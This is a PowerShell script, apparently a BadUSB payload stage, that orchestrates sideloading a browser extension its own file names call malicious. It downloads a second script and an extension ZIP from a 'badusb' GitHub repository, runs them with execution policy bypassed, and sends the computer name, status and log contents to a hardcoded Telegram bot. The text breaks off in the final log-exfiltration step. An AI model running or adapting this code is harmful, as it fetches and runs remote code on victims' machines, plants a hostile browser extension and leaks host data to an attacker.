# Sideload-Orchestrator.ps1
# Downloads components, resolves paths, verifies updates, and orchestrates sideloading.
# Includes fix for here-string terminator placement.

# --- Configuration ---
$Global:LogFile = "$env:TEMP\sideload_orchestrator_log.txt" # Make log file path global

# << URLs Should Be Correct Based on Your Input >>
$MainSideloadScriptUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/PS_Scripts/Sideload-Extension.ps1"
$ExtensionZipUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/MaliciousExtension.zip"
# << END OF URLS >>

$TempDir = "$env:TEMP\BrowserMod_Payload_$(Get-Random)" # Add random to avoid conflicts
$MainSideloadScriptPath = Join-Path $TempDir "Sideload-Extension.ps1"
$ExtensionZipPath = Join-Path $TempDir "MyMaliciousExtension.zip"
$ExtractedExtensionPath = Join-Path $TempDir "MyMaliciousExtension" # Initial (potentially short) path

# --- Functions ---
function Write-Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] $Message"
    Write-Host $LogEntry # For immediate feedback if window is visible
    Add-Content -Path $Global:LogFile -Value $LogEntry -ErrorAction SilentlyContinue
}

function Send-TelegramNotification {
    param([string]$TextMessage)
    $TelegramToken = "7565111023:AAHut-ZUJyU4E5ySxXXNNLOSHq4VPS8e6ZQ" # Your Bot Token
    $TelegramChatID = "6847777757" # Your userID
    
    $SafeMessage = "[Orchestrator: $($env:COMPUTERNAME)]`n" + $TextMessage.Substring(0, [System.Math]::Min($TextMessage.Length, 3800)) # Keep it under limit
    try {
        Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue # For HttpUtility.UrlEncode if not already loaded
        $EncodedMessage = [System.Web.HttpUtility]::UrlEncode($SafeMessage)
        $TelegramApiUrl = "https://api.telegram.org/bot$TelegramToken/sendMessage?chat_id=$TelegramChatID&text=$EncodedMessage&parse_mode=Markdown"
        Invoke-RestMethod -Uri $TelegramApiUrl -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
        Write-Log "Sent Telegram notification."
    }
    catch {
        Write-Log "Error sending Telegram notification: $($_.Exception.Message)"
    }
}

# --- Main Logic ---
Clear-Content -Path $Global:LogFile -ErrorAction SilentlyContinue
Write-Log "Sideload Orchestrator Started."
Send-TelegramNotification "Orchestrator script initiated on $($env:COMPUTERNAME)."

# Create temporary directory
if (Test-Path $TempDir) {
    Write-Log "Removing existing temp directory: $TempDir"
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -Path $TempDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
if (-not (Test-Path $TempDir)) {
    $errMsg = "FATAL ERROR: Could not create temp directory $TempDir"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}
Write-Log "Created temp directory: $TempDir"

# Download Main Sideloading PowerShell Script
Write-Log "Downloading Sideload-Extension.ps1 from: $MainSideloadScriptUrl"
try {
    Invoke-WebRequest -Uri $MainSideloadScriptUrl -OutFile $MainSideloadScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
    Write-Log "Sideload-Extension.ps1 downloaded to: $MainSideloadScriptPath"
    if (-not (Test-Path $MainSideloadScriptPath) -or (Get-Item $MainSideloadScriptPath).Length -lt 100) {
        $errMsg = "FATAL ERROR: Sideload-Extension.ps1 ($MainSideloadScriptPath) not downloaded correctly or is empty. URL: $MainSideloadScriptUrl"
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Sideload-Extension.ps1 appears to be downloaded successfully."
}
catch {
    $errMsg = "FATAL ERROR downloading Sideload-Extension.ps1: $($_.Exception.Message). URL: $MainSideloadScriptUrl"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Download Browser Extension ZIP
Write-Log "Downloading extension ZIP from: $ExtensionZipUrl"
try {
    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $ExtensionZipPath -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Write-Log "Extension ZIP downloaded to: $ExtensionZipPath"
    if (-not (Test-Path $ExtensionZipPath) -or (Get-Item $ExtensionZipPath).Length -lt 1000) {
        $errMsg = "FATAL ERROR: Extension ZIP ($ExtensionZipPath) not downloaded correctly or is too small. URL: $ExtensionZipUrl"
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Extension ZIP appears to be downloaded successfully."
}
catch {
    $errMsg = "FATAL ERROR downloading extension ZIP: $($_.Exception.Message). URL: $ExtensionZipUrl"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Extract Browser Extension
Write-Log "Extracting extension from $ExtensionZipPath to $ExtractedExtensionPath"
try {
    Expand-Archive -Path $ExtensionZipPath -DestinationPath $ExtractedExtensionPath -Force -ErrorAction Stop
    Write-Log "Extension extracted to (short path likely): $ExtractedExtensionPath"
    if (-not (Test-Path $ExtractedExtensionPath) -or -not (Test-Path (Join-Path $ExtractedExtensionPath "manifest.json"))) {
         $errMsg = "FATAL ERROR: Expand-Archive ran but $ExtractedExtensionPath or its manifest.json does not exist!"
         Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Extension appears to be extracted successfully."
}
catch {
    $errMsg = "FATAL ERROR extracting extension ZIP: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# --- Resolve Extracted Path to Long Path Name ---
$longExtractedPath = $ExtractedExtensionPath # Default to original if resolve fails
try {
    Write-Log "Attempting to resolve long path for: $ExtractedExtensionPath"
    $item = Get-Item -LiteralPath $ExtractedExtensionPath -Force -ErrorAction Stop
    if ($item) {
        $longExtractedPath = $item.FullName
        Write-Log "DEBUG: Resolved long path via Get-Item: $longExtractedPath"
    } else {
         Write-Log "WARN: Get-Item returned null for $ExtractedExtensionPath. Using original path."
    }
} catch {
    Write-Log "WARN: Could not resolve long path for $ExtractedExtensionPath using Get-Item: $($_.Exception.Message). Using original path."
}
# --- End Path Resolution ---

# Modify the Sideload-Extension.ps1 to use the resolved long path
Write-Log "Updating Sideload-Extension.ps1 with resolved extension source path: $longExtractedPath"
$placeholder = 'PLACEHOLDER_FOR_EXTENSION_PATH' # Must match placeholder in Sideload-Extension.ps1
try {
    # Read with specific encoding
    $sideloadScriptContent = Get-Content -Path $MainSideloadScriptPath -Raw -Encoding UTF8 -ErrorAction Stop
    
    # Check if placeholder exists BEFORE replacing
    if ($sideloadScriptContent -match [regex]::Escape($placeholder)) {
        Write-Log "DEBUG: Placeholder found in script content before replacement."
        # Perform replacement using the RESOLVED LONG PATH
        $sideloadScriptContent = $sideloadScriptContent.Replace($placeholder, $longExtractedPath)
        
        # Save back with specific encoding
        Set-Content -Path $MainSideloadScriptPath -Value $sideloadScriptContent -Force -Encoding UTF8 -ErrorAction Stop
        Write-Log "Sideload-Extension.ps1 Set-Content executed."

        # --- BEGIN VERIFICATION STEP ---
        # Re-read the file immediately after saving to verify the change
        Start-Sleep -Seconds 1 # Brief pause just in case of file system lag
        $verifyContent = Get-Content -Path $MainSideloadScriptPath -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
        if ($verifyContent -match [regex]::Escape($placeholder)) {
            # If placeholder is STILL found after saving, something went wrong!
            $errMsg = "FATAL ERROR: Placeholder STILL PRESENT in Sideload-Extension.ps1 after Set-Content! Path: $MainSideloadScriptPath"
            Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
        } elseif ($verifyContent -match [regex]::Escape($longExtractedPath)) {
             # If the new path IS found, replacement likely succeeded
             Write-Log "VERIFIED: Placeholder successfully replaced with path '$longExtractedPath' in Sideload-Extension.ps1."
        } else {
            # If neither placeholder nor new path found, file might be corrupt or empty
             $errMsg = "FATAL ERROR: Could not verify placeholder replacement in Sideload-Extension.ps1. File might be corrupt or empty after Set-Content. Path: $MainSideloadScriptPath"
             Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
        }
        # --- END VERIFICATION STEP ---

    } else {
        $errMsg = "Placeholder '$placeholder' not found in downloaded Sideload-Extension.ps1 ($MainSideloadScriptPath). Cannot update path."
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
}
catch {
    $errMsg = "ERROR during update process for Sideload-Extension.ps1: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# DEBUG: Verify path existence just before execution
Write-Log "DEBUG: Verifying existence of resolved path for Sideload-Extension.ps1: $longExtractedPath"
if (Test-Path $longExtractedPath) {
    Write-Log "DEBUG: Resolved path $longExtractedPath EXISTS."
} else {
    Write-Log "DEBUG: CRITICAL - Resolved path $longExtractedPath DOES NOT EXIST before calling Sideload-Extension.ps1."
    Send-TelegramNotification "DEBUG Orchestrator: Resolved path missing before calling Sideload-Extension.ps1: $longExtractedPath"
    # Let Sideload-Extension.ps1 handle its own exit 1 in this case
}

# Execute the Main Sideloading Script
Write-Log "Executing main sideloading script: $MainSideloadScriptPath"
$SideloadExitCode = 1 # Default to error
try {
    # Using Start-Process as before, assuming this part was okay once orchestrator ran
    $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$MainSideloadScriptPath`"" -Wait -PassThru -NoNewWindow
    $SideloadExitCode = $process.ExitCode
    Write-Log "Main sideloading script execution finished with exit code: $SideloadExitCode"
    if ($SideloadExitCode -ne 0) {
        Send-TelegramNotification "Sideload-Extension.ps1 exited with code: $SideloadExitCode. Check target logs."
    } else {
         Send-TelegramNotification "Sideload-Extension.ps1 completed with code 0. Check browser(s) after restart. Check target logs."
    }
}
catch {
    $errMsg = "FATAL ERROR executing main sideloading script (Sideload-Extension.ps1): $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; # Don't exit, let log exfil happen
}

# Exfiltrate the orchestrator log file to Telegram
if (Test-Path $Global:LogFile) {
    $logContent = Get-Content -Path $Global:LogFile -Raw -ErrorAction SilentlyContinue
    if ($logContent) {
        $logSnippet = $logContent.Substring(0, [System.Math]::Min($logContent.Length, 3500))
        # Use Here-String for cleaner formatting - Ensure closing "@ is at start of line
        $telegramMessage = @"
Orchestrator Log ($($env:COMPUTERNAME)):
